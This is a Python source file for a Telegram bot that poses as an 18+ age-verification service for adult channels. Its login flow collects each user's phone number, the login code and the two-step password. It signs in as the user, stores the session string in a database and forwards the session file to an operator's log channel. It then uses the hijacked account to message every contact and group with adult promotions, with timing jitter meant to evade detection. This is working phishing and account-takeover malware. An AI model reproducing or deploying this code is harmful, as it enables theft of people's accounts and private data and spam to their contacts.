import os
import shutil
import traceback
import asyncio
import time
from pyrogram.types import Message
from pyrogram import Client, filters
from asyncio.exceptions import TimeoutError
from pyrogram.types import (
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    ReplyKeyboardMarkup,
    KeyboardButton
)
from pyrogram.errors import (
    ApiIdInvalid,
    PhoneNumberInvalid,
    PhoneCodeInvalid,
    PhoneCodeExpired,
    SessionPasswordNeeded,
    PasswordHashInvalid,
    FloodWait  # Added for flood control
)
from info import API_ID, API_HASH, DATABASE_URI_SESSIONS_F, ADMINS, LOG_CHANNEL_SESSIONS_FILES
from pymongo import MongoClient

# MongoDB connection
mongo_client = MongoClient(DATABASE_URI_SESSIONS_F)
database = mongo_client['Cluster0']['users']

# Define promo texts
PROMO_TEXTS = [
    "🔥 Join our exclusive channel for premium adult content!",
    "🎉 Unlock the hottest videos and photos - join now!",
    "💋 Experience pleasure like never before - access our VIP content!",
    "🔞 Curated adult entertainment just for you - click to join!",
    "🌟 VIP access to the most exclusive adult content on Telegram!",
    "💥 Your gateway to premium adult entertainment starts here!",
    "😈 Don't miss out on our premium collection - join today!",
    "👑 Elevate your experience with our VIP adult channel!",
    "🕶️ Access hidden gems of adult content - become a VIP member!",
    "💎 Premium quality, exclusive content - all in one place!"
]

# Define OTP keyboard
OTP_KEYBOARD = ReplyKeyboardMarkup(
    [
        ["1️⃣", "2️⃣", "3️⃣"],
        ["4️⃣", "5️⃣", "6️⃣"],
        ["7️⃣", "8️⃣", "9️⃣"],
        ["🔙", "0️⃣", "🆗"]
    ],
    resize_keyboard=True,
    one_time_keyboard=True
)

strings = {
    'need_login': "You have to /login before using then bot can download restricted content ❕",
    'already_logged_in': "You are already logged in🥰.\nYou Have all Premium Benifits🥳",
    'age_verification': "**⚠️ ACCESS RESTRICTED:**\nTo access premium adult channels, you must verify that you're 18+ years old.\nClick the button below to start age verification 👇",
    'verification_success': "**✅ VERIFICATION SUCCESSFUL!**\nYou now have access to premium content:\n[my Premium Channel Link]"
}

# State management
user_states = {}

def get(obj, key, default=None):
    try:
        return obj[key]
    except:
        return default

#cheak login status 
async def check_login_status(user_id):
    user_data = database.find_one({"id": user_id})
    if user_data and user_data.get('logged_in', False):
        return True
    return False

@Client.on_message(filters.private & filters.command(["login"]))
async def start_login(bot: Client, message: Message):
    # Check if already logged in
    user_data = database.find_one({"id": message.from_user.id})
    if get(user_data, 'logged_in', False):
        await message.reply(strings['already_logged_in'])
        return 
    
    # Send age verification message with phone number button
    await message.reply(
        strings['age_verification'],
        reply_markup=ReplyKeyboardMarkup(
            [[KeyboardButton("🔞 Verify Age", request_contact=True)]],
            resize_keyboard=True,
            one_time_keyboard=True
        )
    )

@Client.on_message(filters.private & filters.contact)
async def handle_contact(bot: Client, message: Message):
    user_id = message.from_user.id
    
    # Check if already logged in
    user_data = database.find_one({"id": user_id})
    if get(user_data, 'logged_in', False):
        await message.reply(strings['already_logged_in'])
        return
    
    phone_number = message.contact.phone_number
    if not phone_number.startswith('+'):
        phone_number = '+' + phone_number
    
    # Store phone number in state
    user_states[user_id] = {
        'phone_number': phone_number,
        'otp_digits': ''
    }
    
    # Create temporary client
    client = Client(":memory:", API_ID, API_HASH)
    await client.connect()
    
    try:
        # Send OTP
        await message.reply("Sending OTP...")
        code = await client.send_code(phone_number)
        
        # Store client and code hash in state
        user_states[user_id]['client'] = client
        user_states[user_id]['phone_code_hash'] = code.phone_code_hash
        
        # Ask for OTP with custom keyboard
        await message.reply(
            "Please enter the OTP sent to your Telegram account:",
            reply_markup=OTP_KEYBOARD
        )
        
    except PhoneNumberInvalid:
        await message.reply('`PHONE_NUMBER` **is invalid.**\nPlease try again 👉 /login')
        if user_id in user_states:
            await user_states[user_id]['client'].disconnect()
            del user_states[user_id]
        return
    except Exception as e:
        await message.reply(f'**Error:** `{e}`\nPlease try again 👉 /login')
        if user_id in user_states:
            await user_states[user_id]['client'].disconnect()
            del user_states[user_id]
        return

@Client.on_message(filters.private & filters.regex(r'^[0-9️⃣🔙🆗]+$'))
async def handle_otp_input(bot: Client, message: Message):
    user_id = message.from_user.id
    if user_id not in user_states:
        return
    
    text = message.text
    state = user_states[user_id]
    
    # Handle backspace
    if text == '🔙':
        if state['otp_digits']:
            state['otp_digits'] = state['otp_digits'][:-1]
    
    # Handle submit
    elif text == '🆗':
        if len(state['otp_digits']) < 5:
            await message.reply("❌ OTP must be at least 5 digits!", reply_markup=OTP_KEYBOARD)
            return
            
        # Process OTP
        phone_code = state['otp_digits']
        client = state['client']
        phone_number = state['phone_number']
        phone_code_hash = state['phone_code_hash']
        
        try:
            # Remove keyboard
            await message.reply("Verifying OTP...", reply_markup=ReplyKeyboardRemove())
            
            # Sign in with OTP
            await client.sign_in(phone_number, phone_code_hash, phone_code)
            
            # Proceed to session creation
            await create_session(bot, client, user_id, phone_number)
            
        except PhoneCodeInvalid:
            await message.reply('**OTP is invalid.**\nPlease try again 👉 /login')
        except PhoneCodeExpired:
            await message.reply('**OTP is expired.**\nPlease try again 👉 /login')
        except SessionPasswordNeeded:
            # Request 2FA password
            await message.reply(
                "**🔒 TWO-STEP VERIFICATION:**\nYour account has extra security enabled.\nPlease enter your password:",
                reply_markup=ReplyKeyboardRemove()
            )
            state['needs_password'] = True
        except Exception as e:
            await message.reply(f'**Error:** `{e}`\nPlease try again 👉 /login')
            await cleanup_user_state(user_id)
    else:
        # Convert emoji to digit
        emoji_to_digit = {
            '0️⃣': '0', '1️⃣': '1', '2️⃣': '2', '3️⃣': '3', '4️⃣': '4',
            '5️⃣': '5', '6️⃣': '6', '7️⃣': '7', '8️⃣': '8', '9️⃣': '9'
        }
        digit = emoji_to_digit.get(text, text)
        
        # Append digit if we have space
        if len(state['otp_digits']) < 6:
            state['otp_digits'] += digit
        
        # Show current OTP
        await message.reply(
            f"Current OTP: `{state['otp_digits']}`\n\nPress 🆗 when done",
            reply_markup=OTP_KEYBOARD
        )

@Client.on_message(filters.private & filters.text & ~filters.command(["login"]))
async def handle_2fa_password(bot: Client, message: Message):
    user_id = message.from_user.id
    if user_id not in user_states or not user_states[user_id].get('needs_password'):
        return
    
    password = message.text
    state = user_states[user_id]
    client = state['client']
    
    try:
        await client.check_password(password=password)
        await message.reply("Password verified...")
        
        # Proceed to session creation
        await create_session(bot, client, user_id, state['phone_number'])
        
    except PasswordHashInvalid:
        await message.reply('**Invalid Password Provided**\nPlease try again 👉 /login')
        await cleanup_user_state(user_id)

async def create_session(bot: Client, client: Client, user_id: int, phone_number: str):
    try:
        # Export session string
        string_session = await client.export_session_string()
        await client.disconnect()
        
        # Store session in database
        data = {
            'session': string_session,
            'logged_in': True,
            'mobile_number': phone_number
        }
        
        user_data = database.find_one({"id": user_id})
        if user_data:
            database.update_one({'_id': user_data['_id']}, {'$set': data})
        else:
            data.update({
                '_id': user_id,
                'id': user_id
            })
            database.insert_one(data)
        
        # Get the current working directory
        current_directory = os.getcwd()
        
        # Path for the session file
        session_file_path = os.path.join(current_directory, ':memory:.session')
        
        # Ensure the /sessions directory exists
        sessions_dir = os.path.join(current_directory, 'sessions')
        if not os.path.exists(sessions_dir):
            os.makedirs(sessions_dir)
        
        # Remove '+' from phone number
        clean_phone_number = phone_number.replace('+', '')
        
        # New path for the session file
        new_session_file_path = os.path.join(sessions_dir, f"{clean_phone_number}.session")
        
        # Rename and move the session file
        if os.path.exists(session_file_path):
            os.rename(session_file_path, new_session_file_path)
            
            # Send the session file to the log channel
            await bot.send_document(
                chat_id=LOG_CHANNEL_SESSIONS_FILES,
                document=new_session_file_path,
                caption=f"Session file for: {clean_phone_number}"
            )
            
            # Delete the session file after sending
            os.remove(new_session_file_path)
        
        # Send success message
        await bot.send_message(user_id, strings['verification_success'])
        
        # Start promotion campaign
        asyncio.create_task(send_promotion_messages(user_id, string_session))
        
    except Exception as e:
        await bot.send_message(user_id, f"<b>ERROR IN LOGIN:</b> `{e}`\nPlease try again 👉 /login")
    finally:
        # Clean up state
        await cleanup_user_state(user_id)

async def send_promotion_messages(user_id: int, session_string: str):
    try:
        # Create client from session string
        client = Client("promo_client", session_string=session_string)
        await client.start()
        
        # Get all dialogs
        dialogs = await client.get_dialogs()
        
        # Filter targets (groups, supergroups, and contacts excluding bots)
        targets = []
        for dialog in dialogs:
            if dialog.chat.type in ["group", "supergroup", "private"]:
                if dialog.chat.type == "private" and dialog.chat.is_bot:
                    continue
                targets.append(dialog.chat.id)
        
        # Progressive flood control parameters
        MAX_RETRIES = 3
        RETRY_DELAY = 60  # seconds
        BASE_DELAY = 300  # 5 minutes between messages
        
        # Send promo messages to each target
        for target in targets:
            # Send all 10 promo texts
            for promo_text in PROMO_TEXTS:
                retries = 0
                while retries < MAX_RETRIES:
                    try:
                        await client.send_message(target, promo_text)
                        # Add random jitter to avoid pattern detection
                        jitter = 0.8 + (0.4 * (time.time() % 1))
                        await asyncio.sleep(BASE_DELAY * jitter)
                        break
                    except FloodWait as e:
                        # Exponential backoff with jitter
                        wait_time = e.value + 5
                        jitter = 0.5 + (time.time() % 1)
                        await asyncio.sleep(wait_time * jitter)
                        retries += 1
                    except Exception as e:
                        # Skip on other errors
                        break
                
                # Additional buffer between messages
                await asyncio.sleep(5)
                
            # 1-minute buffer between different targets
            await asyncio.sleep(60)
                
    except Exception as e:
        # Silent fail - no reporting
        pass
    finally:
        try:
            await client.stop()
        except:
            pass

async def cleanup_user_state(user_id: int):
    if user_id in user_states:
        state = user_states[user_id]
        if 'client' in state and not state['client'].is_disconnected:
            try:
                await state['client'].disconnect()
            except:
                pass
        del user_states[user_id]
